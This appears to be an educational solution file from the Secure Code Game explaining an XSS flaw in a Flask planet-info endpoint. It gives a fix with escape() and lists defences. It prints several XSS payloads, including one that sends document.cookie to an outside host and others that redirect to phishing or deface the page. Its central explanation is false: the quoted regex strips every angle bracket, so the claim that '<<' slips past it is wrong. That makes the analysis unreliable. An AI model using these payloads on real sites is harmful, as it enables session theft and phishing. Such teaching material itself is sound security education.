This code is vulnerable to Cross-Site Scripting (XSS).

Back to our level in the Secure Code Game, the vulnerable functions are:
- get_planet_info()
- get_planet_info_endpoint()

Why are they vulnerable?

Examine closely the following:
sanitized_planet = re.sub(r'[<>(){}[\]]', '', planet)

In this regex, the characters 
<, >, (, ), {, }, [, and ] 
are explicitly removed, but whitespace characters are not removed.

Then, an anti-XSS defense is implemented, preventing inputs with the 'script' tag. 
However, other tags, such as the 'img' tag, can still used to exploit a XSS bug as follows:

Exploit: 
<<img src="x" onerror="alert(1)">>
 
Explanation: 
In this payload, the double angle brackets, '<<' and '>>', will not be matched by the regex, 
so the payload remains unaffected, and the XSS attack will execute successfully.

How can we fix this?
We can use the function 'escape', which is a built-in function inside the Markup module of Flask. 
This function helps to escape special characters in the input, preventing them from being executed
as HTML or JavaScript.

Example: 
from flask import Flask, request, render_template, jsonify, escape

return f'<h2>Planet Details:</h2><p>{escape(details)}</p>'
 
What else can XSS do?
- Steal cookies and session information
- Redirect to malicious websites
- Modify website content
- Phishing
- Keylogging

How to prevent XSS?
- Sanitize user input properly
- Use Content Security Policy (CSP)
- Use HttpOnly Cookies
- Use X-XSS-Protection header

Here are some exploit examples:

- Redirect to phishing page using XSS:
<<img src="x" onerror="window.location.href = 'https://google.com';">>

- Get cookies:
<<img src="x" onerror="window.location.href = 'https://google.com/?cookie=' + document.cookie;">>

- Modify website content:
You can inject any phishing page, malicious page, or any other content to the website using XSS, by:
<<img src="x" onerror="document.body.innerHTML = '<h1>Website is hacked</h1>';">>
